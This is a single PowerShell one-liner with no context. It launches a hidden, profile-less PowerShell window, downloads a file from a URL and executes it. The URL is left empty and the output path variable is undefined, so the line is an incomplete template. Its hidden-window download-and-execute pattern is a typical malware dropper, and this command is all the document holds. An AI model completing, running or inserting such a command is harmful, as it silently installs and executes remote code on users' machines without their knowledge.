powershell.exe -NoProfile -WindowStyle Hidden -Command "$url = ''; Invoke-WebRequest -Uri $url -OutFile $out; Start-Process -FilePath $out"
